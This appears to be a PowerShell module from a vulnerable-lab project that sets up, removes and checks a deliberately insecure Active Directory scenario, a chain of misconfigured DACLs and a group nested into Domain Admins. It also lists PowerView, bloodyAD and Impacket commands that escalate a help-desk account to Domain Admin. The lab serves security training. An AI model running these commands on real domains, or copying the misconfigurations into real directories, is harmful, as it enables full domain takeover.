#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests ACL abuse chain scenarios in a vulnerable Active Directory lab.

.DESCRIPTION
    This module creates a realistic ACL-based privilege escalation chain (MITRE ATT&CK T1222.001).
    It provisions users, groups, and misconfigured discretionary access control lists (DACLs) that
    allow an attacker to chain permissions from a low-privileged user all the way to Domain Admin.

    The attack chain demonstrates how seemingly innocuous individual permissions can be chained
    together to achieve full domain compromise.

.NOTES
    Module:     VulnAD - ACL Abuse
    Author:     VulnAD Project
    Requires:   ActiveDirectory module, VulnAD-Core.ps1 helpers
    MITRE ID:   T1222.001
#>

function Deploy-ACLAbuse {
    <#
    .SYNOPSIS
        Deploys an ACL abuse chain with misconfigured DACLs leading to Domain Admin.

    .DESCRIPTION
        Creates four users, two groups, and a series of DACL misconfigurations that form
        an exploitable privilege escalation chain. The Server-Admins group is nested into
        Domain Admins, creating a path to full domain compromise.

    .PARAMETER Difficulty
        Attack difficulty level: Easy, Medium, or Hard.

    .PARAMETER DomainDN
        Distinguished name of the domain (e.g., DC=contoso,DC=com).

    .PARAMETER Domain
        FQDN of the domain (e.g., contoso.com).

    .EXAMPLE
        Deploy-ACLAbuse -Difficulty Medium -DomainDN 'DC=vulnlab,DC=local' -Domain 'vulnlab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying ACL Abuse scenario ($Difficulty difficulty)" -Type Info

    $createdObjects = [System.Collections.Generic.List[string]]::new()

    # ── Step 1: Create Users ──────────────────────────────────────────────────
    $users = @(
        @{
            SamAccountName = 's.parker'
            Name           = 'Sarah Parker'
            Description    = 'Help Desk Operator - ACL chain entry point'
            PasswordIndex  = 0
        },
        @{
            SamAccountName = 'l.chen'
            Name           = 'Linda Chen'
            Description    = 'IT Operations - GenericWrite on service account'
            PasswordIndex  = 1
        },
        @{
            SamAccountName = 'j.martinez'
            Name           = 'Jorge Martinez'
            Description    = 'Network Engineer - WriteOwner privilege'
            PasswordIndex  = 2
        },
        @{
            SamAccountName = 'k.davis'
            Name           = 'Karen Davis'
            Description    = 'Application Support - ForceChangePassword right'
            PasswordIndex  = 3
        }
    )

    foreach ($userDef in $users) {
        try {
            $password = Get-VulnPassword -Difficulty $Difficulty -Index $userDef.PasswordIndex

            $user = New-VulnUser -SamAccountName $userDef.SamAccountName `
                                 -Name $userDef.Name `
                                 -Password $password `
                                 -DomainDN $DomainDN `
                                 -Description $userDef.Description

            if ($user) {
                $createdObjects.Add("User: $($userDef.SamAccountName)")
                Write-VulnResult -Name $userDef.SamAccountName -Detail "User created" -Success $true
            }
        }
        catch {
            Write-VulnResult -Name $userDef.SamAccountName -Detail "Failed: $($_.Exception.Message)" -Success $false
            Write-VulnStatus -Message "Error creating $($userDef.SamAccountName): $($_.Exception.Message)" -Type Error
        }
    }

    # ── Step 2: Create Groups ─────────────────────────────────────────────────
    $groups = @(
        @{
            Name        = 'IT-Support'
            Description = 'IT Support Group - intermediate ACL chain link'
        },
        @{
            Name        = 'Server-Admins'
            Description = 'Server Administrators - nested into Domain Admins'
        }
    )

    foreach ($groupDef in $groups) {
        try {
            $group = New-VulnGroup -Name $groupDef.Name `
                                   -DomainDN $DomainDN `
                                   -Description $groupDef.Description

            if ($group) {
                $createdObjects.Add("Group: $($groupDef.Name)")
                Write-VulnResult -Name $groupDef.Name -Detail "Group created" -Success $true
            }
        }
        catch {
            Write-VulnResult -Name $groupDef.Name -Detail "Failed: $($_.Exception.Message)" -Success $false
            Write-VulnStatus -Message "Error creating $($groupDef.Name): $($_.Exception.Message)" -Type Error
        }
    }

    # ── Step 3: Configure the ACL Abuse Chain ─────────────────────────────────
    $itSupportDN    = "CN=IT-Support,OU=Groups,OU=ADMonolith,$DomainDN"
    $serverAdminsDN = "CN=Server-Admins,OU=Groups,OU=ADMonolith,$DomainDN"
    $svcMssqlDN     = "CN=MSSQL Service Account,OU=ServiceAccounts,OU=ADMonolith,$DomainDN"
    $kDavisDN       = "CN=Karen Davis,OU=Users,OU=ADMonolith,$DomainDN"

    # ACL 1: s.parker -> GenericAll -> IT-Support group
    try {
        Set-VulnACL -TargetDN $itSupportDN -PrincipalSamAccount 's.parker' -Rights GenericAll
        $createdObjects.Add("ACL: s.parker -> GenericAll -> IT-Support")
        Write-VulnResult -Name 'ACL-GenericAll' -Detail 's.parker -> GenericAll -> IT-Support' -Success $true
    }
    catch {
        Write-VulnResult -Name 'ACL-GenericAll' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "ACL error (GenericAll): $($_.Exception.Message)" -Type Error
    }

    # ACL 2: IT-Support -> WriteDacl -> Server-Admins group
    try {
        Set-VulnACL -TargetDN $serverAdminsDN -PrincipalSamAccount 'IT-Support' -Rights WriteDacl
        $createdObjects.Add("ACL: IT-Support -> WriteDacl -> Server-Admins")
        Write-VulnResult -Name 'ACL-WriteDacl' -Detail 'IT-Support -> WriteDacl -> Server-Admins' -Success $true
    }
    catch {
        Write-VulnResult -Name 'ACL-WriteDacl' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "ACL error (WriteDacl): $($_.Exception.Message)" -Type Error
    }

    # ACL 3: j.martinez -> WriteOwner -> k.davis (high-priv user target)
    try {
        Set-VulnACL -TargetDN $kDavisDN -PrincipalSamAccount 'j.martinez' -Rights WriteOwner
        $createdObjects.Add("ACL: j.martinez -> WriteOwner -> k.davis")
        Write-VulnResult -Name 'ACL-WriteOwner' -Detail 'j.martinez -> WriteOwner -> k.davis' -Success $true
    }
    catch {
        Write-VulnResult -Name 'ACL-WriteOwner' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "ACL error (WriteOwner): $($_.Exception.Message)" -Type Error
    }

    # ACL 4: l.chen -> GenericWrite -> svc_mssql (service account)
    try {
        Set-VulnACL -TargetDN $svcMssqlDN -PrincipalSamAccount 'l.chen' -Rights GenericWrite
        $createdObjects.Add("ACL: l.chen -> GenericWrite -> svc_mssql")
        Write-VulnResult -Name 'ACL-GenericWrite' -Detail 'l.chen -> GenericWrite -> svc_mssql' -Success $true
    }
    catch {
        Write-VulnResult -Name 'ACL-GenericWrite' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "ACL error (GenericWrite): $($_.Exception.Message)" -Type Error
    }

    # ACL 5: k.davis -> ExtendedRight (ForceChangePassword) -> j.martinez
    try {
        $jMartinezDN = "CN=Jorge Martinez,OU=Users,OU=ADMonolith,$DomainDN"
        Set-VulnACL -TargetDN $jMartinezDN `
                    -PrincipalSamAccount 'k.davis' `
                    -Rights ExtendedRight `
                    -ObjectType '00299570-246d-11d0-a768-00aa006e0529'   # User-Force-Change-Password
        $createdObjects.Add("ACL: k.davis -> ForceChangePassword -> j.martinez")
        Write-VulnResult -Name 'ACL-ForceChangePwd' -Detail 'k.davis -> ForceChangePassword -> j.martinez' -Success $true
    }
    catch {
        Write-VulnResult -Name 'ACL-ForceChangePwd' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "ACL error (ForceChangePassword): $($_.Exception.Message)" -Type Error
    }

    # ── Step 4: Nest Server-Admins into Domain Admins ─────────────────────────
    try {
        $serverAdminsGroup = Get-ADGroup -Identity 'Server-Admins' -ErrorAction Stop
        Add-ADGroupMember -Identity 'Domain Admins' -Members $serverAdminsGroup
        $createdObjects.Add("Group Nesting: Server-Admins -> Domain Admins")
        Write-VulnResult -Name 'DA-Nesting' -Detail 'Server-Admins added to Domain Admins' -Success $true
    }
    catch {
        Write-VulnResult -Name 'DA-Nesting' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error nesting into Domain Admins: $($_.Exception.Message)" -Type Error
    }

    Write-VulnResult -Name 'ACL Abuse Chain' -Detail "Deployed $($createdObjects.Count) objects and ACLs" -Success ($createdObjects.Count -gt 0) -IsLast

    return @{
        Scenario       = 'ACL Abuse Chain'
        Description    = @(
            'This scenario creates a chain of misconfigured Active Directory DACLs that can be',
            'exploited to escalate from a low-privileged Help Desk account to Domain Admin.',
            'Each ACL grants a specific abusable right (GenericAll, WriteDacl, WriteOwner,',
            'GenericWrite, ForceChangePassword) that enables the next step in the chain.'
        ) -join ' '
        CreatedObjects = $createdObjects.ToArray()
        AttackCommands = @(
            "# PowerView - Enumerate abusable ACLs",
            "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {`$_.IdentityReferenceName -match 's.parker|IT-Support|l.chen|j.martinez|k.davis'}",
            "",
            "# Step 1: s.parker -> GenericAll on IT-Support (add self to group)",
            "Add-DomainGroupMember -Identity 'IT-Support' -Members 's.parker' -Credential `$cred",
            "",
            "# Step 2: IT-Support -> WriteDacl on Server-Admins (grant self GenericAll)",
            "Add-DomainObjectAcl -TargetIdentity 'Server-Admins' -PrincipalIdentity 's.parker' -Rights All -Credential `$cred",
            "",
            "# Step 3: Add self to Server-Admins -> DA via group nesting",
            "Add-DomainGroupMember -Identity 'Server-Admins' -Members 's.parker' -Credential `$cred",
            "",
            "# bloodyAD - Alternative exploitation",
            "bloodyAD -d $Domain -u s.parker -p <password> --host <DC_IP> add groupMember 'IT-Support' 's.parker'",
            "bloodyAD -d $Domain -u s.parker -p <password> --host <DC_IP> add genericAll 'Server-Admins' 's.parker'",
            "",
            "# Impacket - dacledit / owneredit",
            "impacket-dacledit $Domain/s.parker:<password> -action write -rights FullControl -principal s.parker -target 'Server-Admins' -dc-ip <DC_IP>",
            "impacket-owneredit $Domain/j.martinez:<password> -action write -new-owner j.martinez -target k.davis -dc-ip <DC_IP>"
        )
        AttackPath     = @(
            '┌─────────────────────────────────────────────────────────────────┐',
            '│  s.parker (Help Desk)                                          │',
            '│    │ GenericAll                                                 │',
            '│    ▼                                                            │',
            '│  IT-Support (Group) ─── add self as member                     │',
            '│    │ WriteDacl                                                  │',
            '│    ▼                                                            │',
            '│  Server-Admins (Group) ─── grant self GenericAll, add self     │',
            '│    │ Member Of                                                  │',
            '│    ▼                                                            │',
            '│  Domain Admins ─── FULL DOMAIN COMPROMISE                      │',
            '│                                                                 │',
            '│  Parallel chains:                                               │',
            '│  l.chen ──GenericWrite──> svc_mssql (add SPN, Kerberoast)      │',
            '│  j.martinez ──WriteOwner──> k.davis (take ownership, reset pw) │',
            '│  k.davis ──ForceChangePwd──> j.martinez (reset password)       │',
            '└─────────────────────────────────────────────────────────────────┘'
        ) -join "`n"
        MitreID        = 'T1222.001'
        Difficulty     = $Difficulty
    }
}

function Remove-ACLAbuse {
    <#
    .SYNOPSIS
        Removes all ACL Abuse scenario objects from Active Directory.

    .DESCRIPTION
        Removes the Server-Admins group from Domain Admins, deletes groups and users.
        ACL entries are cleaned implicitly when the principal or target objects are deleted.
    #>
    [CmdletBinding()]
    param()

    Write-VulnStatus -Message 'Removing ACL Abuse scenario objects' -Type Info

    # Step 1: Remove Server-Admins from Domain Admins
    try {
        $serverAdmins = Get-ADGroup -Identity 'Server-Admins' -ErrorAction Stop
        Remove-ADGroupMember -Identity 'Domain Admins' -Members $serverAdmins -Confirm:$false
        Write-VulnResult -Name 'DA-Nesting' -Detail 'Server-Admins removed from Domain Admins' -Success $true
    }
    catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        Write-VulnResult -Name 'DA-Nesting' -Detail 'Server-Admins not found (already removed)' -Success $true
    }
    catch {
        Write-VulnResult -Name 'DA-Nesting' -Detail "Removal failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error removing DA nesting: $($_.Exception.Message)" -Type Error
    }

    # Step 2: Remove groups
    $groups = @('IT-Support', 'Server-Admins')
    foreach ($groupName in $groups) {
        try {
            $group = Get-ADGroup -Identity $groupName -ErrorAction Stop
            Remove-ADGroup -Identity $group -Confirm:$false
            Write-VulnResult -Name $groupName -Detail 'Group removed' -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name $groupName -Detail 'Not found (already removed)' -Success $true
        }
        catch {
            Write-VulnResult -Name $groupName -Detail "Removal failed: $($_.Exception.Message)" -Success $false
        }
    }

    # Step 3: Remove users
    $accounts = @('s.parker', 'l.chen', 'j.martinez', 'k.davis')
    foreach ($account in $accounts) {
        try {
            $adUser = Get-ADUser -Identity $account -ErrorAction Stop
            Remove-ADUser -Identity $adUser -Confirm:$false
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Removed successfully' -Success $true -IsLast:$isLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Not found (already removed)' -Success $true -IsLast:$isLast
        }
        catch {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail "Removal failed: $($_.Exception.Message)" -Success $false -IsLast:$isLast
        }
    }
}

function Test-ACLAbuse {
    <#
    .SYNOPSIS
        Validates that the ACL Abuse scenario is correctly deployed.

    .DESCRIPTION
        Checks that users, groups, ACL entries, and Domain Admins nesting exist.

    .PARAMETER Domain
        FQDN of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$Domain
    )

    Write-VulnStatus -Message 'Testing ACL Abuse scenario deployment' -Type Info

    $allPassed = $true

    # Check users exist
    foreach ($account in @('s.parker', 'l.chen', 'j.martinez', 'k.davis')) {
        try {
            Get-ADUser -Identity $account -ErrorAction Stop | Out-Null
            Write-VulnResult -Name $account -Detail 'User exists' -Success $true
        }
        catch {
            Write-VulnResult -Name $account -Detail 'User NOT found' -Success $false
            $allPassed = $false
        }
    }

    # Check groups exist
    foreach ($groupName in @('IT-Support', 'Server-Admins')) {
        try {
            Get-ADGroup -Identity $groupName -ErrorAction Stop | Out-Null
            Write-VulnResult -Name $groupName -Detail 'Group exists' -Success $true
        }
        catch {
            Write-VulnResult -Name $groupName -Detail 'Group NOT found' -Success $false
            $allPassed = $false
        }
    }

    # Check Server-Admins is member of Domain Admins
    try {
        $daMembers = Get-ADGroupMember -Identity 'Domain Admins' -ErrorAction Stop
        $isMember = $daMembers | Where-Object { $_.Name -eq 'Server-Admins' }
        if ($isMember) {
            Write-VulnResult -Name 'DA-Nesting' -Detail 'Server-Admins IS a member of Domain Admins' -Success $true
        }
        else {
            Write-VulnResult -Name 'DA-Nesting' -Detail 'Server-Admins is NOT in Domain Admins' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'DA-Nesting' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    Write-VulnResult -Name 'ACL Abuse Chain' `
                     -Detail $(if ($allPassed) { 'All checks passed' } else { 'Some checks FAILED' }) `
                     -Success $allPassed -IsLast

    return $allPassed
}

Export-ModuleMember -Function Deploy-ACLAbuse, Remove-ACLAbuse, Test-ACLAbuse

